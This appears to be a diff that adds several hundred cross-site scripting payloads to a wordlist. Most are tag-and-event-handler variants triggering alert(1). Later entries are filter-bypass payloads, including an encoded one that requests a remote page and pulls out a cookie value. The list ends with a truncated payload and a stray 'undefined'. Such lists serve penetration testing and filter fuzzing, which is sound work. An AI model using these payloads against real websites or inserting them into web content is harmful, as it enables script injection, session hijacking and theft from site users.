+<rt onclick="alert(1)">test</rt>
+<rt onfocusout=alert(1) tabindex=1 id=x></rt><input autofocus>
+<rt onmouseover="alert(1)">test</rt>
+<rtc id=x tabindex=1 onfocus=alert(1)></rtc>
+<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>
+<rtc onclick="alert(1)">test</rtc>
+<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>
+<rtc onmouseover="alert(1)">test</rtc>
+<ruby id=x tabindex=1 onfocus=alert(1)></ruby>
+<ruby id=x tabindex=1 onfocusin=alert(1)></ruby>
+<ruby onclick="alert(1)">test</ruby>
+<ruby onfocusout=alert(1) tabindex=1 id=x></ruby><input autofocus>
+<ruby onmouseover="alert(1)">test</ruby>
+<s id=x tabindex=1 onfocus=alert(1)></s>
+<s id=x tabindex=1 onfocusin=alert(1)></s>
+<s onclick="alert(1)">test</s>
+<s onfocusout=alert(1) tabindex=1 id=x></s><input autofocus>
+<s onmouseover="alert(1)">test</s>
+<samp id=x tabindex=1 onfocus=alert(1)></samp>
+<samp id=x tabindex=1 onfocusin=alert(1)></samp>
+<samp onclick="alert(1)">test</samp>
+<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>
+<samp onmouseover="alert(1)">test</samp>
+<section id=x tabindex=1 onfocus=alert(1)></section>
+<section id=x tabindex=1 onfocusin=alert(1)></section>
+<section onclick="alert(1)">test</section>
+<section onfocusout=alert(1) tabindex=1 id=x></section><input autofocus>
+<section onmouseover="alert(1)">test</section>
+<select autofocus onfocus=alert(1)>
+<select autofocus onfocusin=alert(1)>
+<select onclick="alert(1)">test</select>
+<select onfocusout=alert(1) id=x></select><input autofocus>
+<select onmouseover="alert(1)">test</select>
+<shadow id=x tabindex=1 onfocus=alert(1)></shadow>
+<shadow id=x tabindex=1 onfocusin=alert(1)></shadow>
+<shadow onclick="alert(1)">test</shadow>
+<shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>
+<shadow onmouseover="alert(1)">test</shadow>
+<slot id=x tabindex=1 onfocus=alert(1)></slot>
+<slot id=x tabindex=1 onfocusin=alert(1)></slot>
+<slot onclick="alert(1)">test</slot>
+<slot onfocusout=alert(1) tabindex=1 id=x></slot><input autofocus>
+<slot onmouseover="alert(1)">test</slot>
+<small id=x tabindex=1 onfocus=alert(1)></small>
+<small id=x tabindex=1 onfocusin=alert(1)></small>
+<small onclick="alert(1)">test</small>
+<small onfocusout=alert(1) tabindex=1 id=x></small><input autofocus>
+<small onmouseover="alert(1)">test</small>
+<source id=x tabindex=1 onfocus=alert(1)></source>
+<source id=x tabindex=1 onfocusin=alert(1)></source>
+<source onclick="alert(1)">test</source>
+<source onfocusout=alert(1) tabindex=1 id=x></source><input autofocus>
+<source onmouseover="alert(1)">test</source>
+<spacer id=x tabindex=1 onfocus=alert(1)></spacer>
+<spacer id=x tabindex=1 onfocusin=alert(1)></spacer>
+<spacer onclick="alert(1)">test</spacer>
+<spacer onfocusout=alert(1) tabindex=1 id=x></spacer><input autofocus>
+<spacer onmouseover="alert(1)">test</spacer>
+<span id=x tabindex=1 onfocus=alert(1)></span>
+<span id=x tabindex=1 onfocusin=alert(1)></span>
+<span onclick="alert(1)">test</span>
+<span onfocusout=alert(1) tabindex=1 id=x></span><input autofocus>
+<span onmouseover="alert(1)">test</span>
+<strike id=x tabindex=1 onfocus=alert(1)></strike>
+<strike id=x tabindex=1 onfocusin=alert(1)></strike>
+<strike onclick="alert(1)">test</strike>
+<strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus>
+<strike onmouseover="alert(1)">test</strike>
+<strong id=x tabindex=1 onfocus=alert(1)></strong>
+<strong id=x tabindex=1 onfocusin=alert(1)></strong>
+<strong onclick="alert(1)">test</strong>
+<strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>
+<strong onmouseover="alert(1)">test</strong>
+<style id=x tabindex=1 onfocus=alert(1)></style>
+<style id=x tabindex=1 onfocusin=alert(1)></style>
+<style onclick="alert(1)">test</style>
+<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>
+<style onmouseover="alert(1)">test</style>
+<sub id=x tabindex=1 onfocus=alert(1)></sub>
+<sub id=x tabindex=1 onfocusin=alert(1)></sub>
+<sub onclick="alert(1)">test</sub>
+<sub onfocusout=alert(1) tabindex=1 id=x></sub><input autofocus>
+<sub onmouseover="alert(1)">test</sub>
+<summary id=x tabindex=1 onfocus=alert(1)></summary>
+<summary id=x tabindex=1 onfocusin=alert(1)></summary>
+<summary onclick="alert(1)">test</summary>
+<summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>
+<summary onmouseover="alert(1)">test</summary>
+<sup id=x tabindex=1 onfocus=alert(1)></sup>
+<sup id=x tabindex=1 onfocusin=alert(1)></sup>
+<sup onclick="alert(1)">test</sup>
+<sup onfocusout=alert(1) tabindex=1 id=x></sup><input autofocus>
+<sup onmouseover="alert(1)">test</sup>
+<svg id=x onfocus=alert(1)>
+<svg id=x onfocusin=alert(1)>
+<svg onclick="alert(1)">test</svg>
+<svg onfocusout=alert(1) tabindex=1 id=x></svg><input autofocus>
+<svg onmouseover="alert(1)">test</svg>
+<svg><image href=1 onerror=alert(1)>
+<table id=x tabindex=1 onfocus=alert(1)></table>
+<table id=x tabindex=1 onfocusin=alert(1)></table>
+<table onclick="alert(1)">test</table>
+<table onfocusout=alert(1) tabindex=1 id=x></table><input autofocus>
+<table onmouseover="alert(1)">test</table>
+<tbody id=x tabindex=1 onfocus=alert(1)></tbody>
+<tbody id=x tabindex=1 onfocusin=alert(1)></tbody>
+<tbody onclick="alert(1)">test</tbody>
+<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>
+<tbody onmouseover="alert(1)">test</tbody>
+<td id=x tabindex=1 onfocus=alert(1)></td>
+<td id=x tabindex=1 onfocusin=alert(1)></td>
+<td onclick="alert(1)">test</td>
+<td onfocusout=alert(1) tabindex=1 id=x></td><input autofocus>
+<td onmouseover="alert(1)">test</td>
+<template id=x tabindex=1 onfocus=alert(1)></template>
+<template id=x tabindex=1 onfocusin=alert(1)></template>
+<template onclick="alert(1)">test</template>
+<template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>
+<template onmouseover="alert(1)">test</template>
+<textarea autofocus onfocus=alert(1)>test</textarea>
+<textarea autofocus onfocusin=alert(1)>test</textarea>
+<textarea onclick="alert(1)">test</textarea>
+<textarea onfocusout=alert(1) id=x></textarea><input autofocus>
+<textarea onmouseover="alert(1)">test</textarea>
+<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>
+<tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>
+<tfoot onclick="alert(1)">test</tfoot>
+<tfoot onfocusout=alert(1) tabindex=1 id=x></tfoot><input autofocus>
+<tfoot onmouseover="alert(1)">test</tfoot>
+<th id=x tabindex=1 onfocus=alert(1)></th>
+<th id=x tabindex=1 onfocusin=alert(1)></th>
+<th onclick="alert(1)">test</th>
+<th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>
+<th onmouseover="alert(1)">test</th>
+<thead id=x tabindex=1 onfocus=alert(1)></thead>
+<thead id=x tabindex=1 onfocusin=alert(1)></thead>
+<thead onclick="alert(1)">test</thead>
+<thead onfocusout=alert(1) tabindex=1 id=x></thead><input autofocus>
+<thead onmouseover="alert(1)">test</thead>
+<time id=x tabindex=1 onfocus=alert(1)></time>
+<time id=x tabindex=1 onfocusin=alert(1)></time>
+<time onclick="alert(1)">test</time>
+<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>
+<time onmouseover="alert(1)">test</time>
+<title id=x tabindex=1 onfocus=alert(1)></title>
+<title id=x tabindex=1 onfocusin=alert(1)></title>
+<title onclick="alert(1)">test</title>
+<title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>
+<title onmouseover="alert(1)">test</title>
+<tr id=x tabindex=1 onfocus=alert(1)></tr>
+<tr id=x tabindex=1 onfocusin=alert(1)></tr>
+<tr onclick="alert(1)">test</tr>
+<tr onfocusout=alert(1) tabindex=1 id=x></tr><input autofocus>
+<tr onmouseover="alert(1)">test</tr>
+<track id=x tabindex=1 onfocus=alert(1)></track>
+<track id=x tabindex=1 onfocusin=alert(1)></track>
+<track onclick="alert(1)">test</track>
+<track onfocusout=alert(1) tabindex=1 id=x></track><input autofocus>
+<track onmouseover="alert(1)">test</track>
+<tt id=x tabindex=1 onfocus=alert(1)></tt>
+<tt id=x tabindex=1 onfocusin=alert(1)></tt>
+<tt onclick="alert(1)">test</tt>
+<tt onfocusout=alert(1) tabindex=1 id=x></tt><input autofocus>
+<tt onmouseover="alert(1)">test</tt>
+<u id=x tabindex=1 onfocus=alert(1)></u>
+<u id=x tabindex=1 onfocusin=alert(1)></u>
+<u onclick="alert(1)">test</u>
+<u onfocusout=alert(1) tabindex=1 id=x></u><input autofocus>
+<u onmouseover="alert(1)">test</u>
+<ul id=x tabindex=1 onfocus=alert(1)></ul>
+<ul id=x tabindex=1 onfocusin=alert(1)></ul>
+<ul onclick="alert(1)">test</ul>
+<ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>
+<ul onmouseover="alert(1)">test</ul>
+<var id=x tabindex=1 onfocus=alert(1)></var>
+<var id=x tabindex=1 onfocusin=alert(1)></var>
+<var onclick="alert(1)">test</var>
+<var onfocusout=alert(1) tabindex=1 id=x></var><input autofocus>
+<var onmouseover="alert(1)">test</var>
+<video id=x controls onfocus=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+<video id=x controls onfocusin=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+<video onclick="alert(1)">test</video>
+<video onfocusout=alert(1) tabindex=1 id=x></video><input autofocus>
+<video onmouseover="alert(1)">test</video>
+<video src/onerror=alert(1)>
+<video><source onerror=alert(1) src=1></video>
+<wbr id=x tabindex=1 onfocus=alert(1)></wbr>
+<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>
+<wbr onclick="alert(1)">test</wbr>
+<wbr onfocusout=alert(1) tabindex=1 id=x></wbr><input autofocus>
+<wbr onmouseover="alert(1)">test</wbr>
+<xmp id=x tabindex=1 onfocus=alert(1)></xmp>
+<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>
+<xmp onclick="alert(1)">test</xmp>
+<xmp onfocusout=alert(1) tabindex=1 id=x></xmp><input autofocus>
+<xmp onmouseover="alert(1)">test</xmp>
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+<xss id=x tabindex=1 onfocusin=alert(1)></xss>
+<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>
+' onmouseover=alert(/XSS/)
+x”</title><img src%3dx onerror%3dalert(1)>
+<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23
+<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<var onmouseover="prompt(1)">On Mouse Over</var>?
+<img src="/" =_=" title="onerror='prompt(1)'">
+<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
+<img src=`xx:xx`onerror=alert(1)>
+<img src ?itworksonchrome?\/onerror = alert(1)???
+<div/onmouseover='alert(1)'> style="x:">
+<--`<img/src=` onerror=alert(1)> --!>
+<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>?
+"><img src=x onerror=window.open('https://www.google.com/');>
+"><img src=x onerror=prompt(1);>
+<--`<iMG/srC=` onerror=confirm``> --!>
+<D3"<"/OncLick="1>[confirm``]"<">z
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//["'`-->]]>]</div>
+<div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//["'`-->]]>]</div><div id="30"><style>@import "data:,*%7bx:expression(alert(30))%7D";</style>//["'`-->]]>]</div><div id="31"><frameset onload=alert(31)>//["'`-->]]>]</div><div id="32"><table background="javascript:alert(32)"></table>//["'`-->]]>]</div><div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(33);">XXX</a></a><a href="javascript:alert(2)">XXX</a>//["'`-->]]>]</div><div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["'`-->]]>]</div><div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["'`-->]]>]</div><div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(36)">XXX</a>//["'`-->]]>]</div><div id="37"><!--<img src="--><img src=x onerror=alert(37)//">//["'`-->]]>]</div><div id="38"><comment><img src="</comment><img src=x onerror=alert(38)//">//["'`-->]]>]</div>
+<![><img src="]><img src=x onerror=alert(39)//">
+<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>//["'`-->]]>]</div>
+<div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["'`-->]]>]</div>
+<div id="41"><li style=list-style:url() onerror=alert(41)></li>
+<x '="foo"><x foo='><img src=x onerror=alert(62)//'>
+<! '="foo"><x foo='><img src=x onerror=alert(2)//'>
+<? '="foo"><x foo='><img src=x onerror=alert(3)//'>//["'`-->]]>]</div>
+<div id="67"><!DOCTYPE x [   <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x"onerror CDATA "alert(67)"onload CDATA "alert(2)">]><img />//["'`-->]]>]</div>
+<set attributeName="onmouseover" to="alert(89)"/>
+<div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["'`-->]]>]</div><div id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div><div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(108)></a>">
+<!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//">
+<?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">//["'`-->]]>]</div>
+<!--[if<img src=x onerror=alert(2)//]> -->//["'`-->]]>]</div>
+<t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;">//["'`-->]]>]</div>
+<body><a href="#" onclick="makePopups()">Spam</a>//["'`-->]]>]</div>
+<div id="128"><svg><style>&lt;img/src=x onerror=alert(128)// </b>//["'`-->]]>]</div>
+<div id="133"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//["'`-->]]>]</div>
+<img alt='%></xmp><img src=xx:x onerror=aler
+<div id="138"><link rel="import" href="test.svg" />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />//["'`-->]]>]</div>undefined
